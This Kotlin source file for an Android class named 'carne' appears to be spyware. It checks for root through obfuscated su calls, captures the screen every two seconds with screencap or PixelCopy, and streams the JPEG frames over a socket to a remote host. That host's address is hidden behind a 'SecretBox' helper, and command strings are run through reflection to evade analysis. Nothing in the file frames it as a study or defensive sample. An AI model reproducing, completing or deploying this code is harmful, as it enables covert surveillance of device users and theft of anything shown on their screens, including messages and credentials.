package com.example.mobsec_823

import android.app.Activity
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.PixelCopy
import com.example.mobsec_823.utils.SafetyNet
import com.example.mobsec_823.utils.SecretBox
import java.io.ByteArrayOutputStream
import java.io.OutputStream
import java.net.Socket
import java.util.Collections
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class carne(private val context: Context, private val activity: Activity? = null) {
    private val TAG = "CarneTask"
    private val screenshots = Collections.synchronizedList(mutableListOf<ByteArray>())
    private val scheduler = Executors.newSingleThreadScheduledExecutor()
    private var isRunning = false
    private val remoteIp = SecretBox.getKitchenAddress()
    private val remotePort = SecretBox.getCarnePort()
    private var totalFramesCaptured = 0
    private var cachedRootAvailable: Boolean? = null

    fun start() {
        if (isRunning) return
        isRunning = true
        
        scheduler.scheduleWithFixedDelay({
            if (isRunning) {
                if (!SafetyNet.checkKitchenPermit(88)) return@scheduleWithFixedDelay
                
                if (checkRootAvailability()) {
                    captureWithRoot()
                } else if (activity != null) {
                    captureInApp(activity)
                }
            }
        }, 0, 2, TimeUnit.SECONDS)
        
        startRemoteForwarding()
    }

    private fun checkRootAvailability(): Boolean {
        cachedRootAvailable?.let { return it }
        return try {
            val process = SecretBox.reflectedExec(SecretBox.getSuCmd()) ?: return false
            val os = process.outputStream
            os.write("id\n${SecretBox.getExitCmd()}\n".toByteArray())
            os.flush()
            val output = process.inputStream.bufferedReader().readText()
            process.waitFor()
            val available = output.contains("uid=0")
            cachedRootAvailable = available
            available
        } catch (e: Exception) {
            false
        }
    }

    private fun captureWithRoot() {
        try {
            // Using an array for exec() to avoid shell parsing issues with spaces/dashes
            val su = SecretBox.getSuCmd()
            val screencap = SecretBox.getScreencapCmd()
            val cmd = arrayOf(su, "-c", screencap)
            
            val process = SecretBox.reflectedExec(cmd) ?: return
            val pngBytes = process.inputStream.readBytes()
            process.waitFor()

            if (pngBytes.isNotEmpty()) {
                BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size)?.let {
                    processBitmap(it)
                    it.recycle()
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Network error")
        }
    }

    private fun captureInApp(act: Activity) {
        val window = act.window
        val view = window.decorView
        if (view.width <= 0 || view.height <= 0) return
        val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
        val thread = HandlerThread("PixelCopy").apply { start() }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            PixelCopy.request(window, bitmap, { result ->
                if (result == PixelCopy.SUCCESS) {
                    processBitmap(bitmap)
                }
                bitmap.recycle()
                thread.quitSafely()
            }, Handler(thread.looper))
        }
    }

    private fun processBitmap(bitmap: Bitmap) {
        val out = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
        val bytes = out.toByteArray()
        synchronized(screenshots) {
            screenshots.add(bytes)
            totalFramesCaptured++
            if (screenshots.size > 5) screenshots.removeAt(0)
        }
    }

    private fun startRemoteForwarding() {
        Thread {
            while (isRunning) {
                var socket: Socket? = null
                try {
                    socket = Socket(remoteIp, remotePort)
                    val os = socket.getOutputStream()
                    
                    var sentCount = 0
                    while (isRunning && !socket.isClosed) {
                        getNextFrame(sentCount)?.let {
                            os.write(it)
                            os.flush()
                            sentCount = Math.max(sentCount + 1, totalFramesCaptured - screenshots.size + 1)
                            Thread.sleep(1000) 
                        } ?: Thread.sleep(1000)
                    }
                } catch (e: Exception) {
                    Thread.sleep(5000)
                } finally {
                    try { socket?.close() } catch (ex: Exception) {}
                }
            }
        }.start()
    }

    private fun getNextFrame(lastSent: Int): ByteArray? = synchronized(screenshots) {
        if (screenshots.isEmpty()) return null
        val start = totalFramesCaptured - screenshots.size
        val idx = (if (lastSent == 0) start else lastSent) - start
        if (idx < 0) screenshots[0] else if (idx < screenshots.size) screenshots[idx] else null
    }

    fun stop() {
        isRunning = false
        scheduler.shutdown()
    }
}
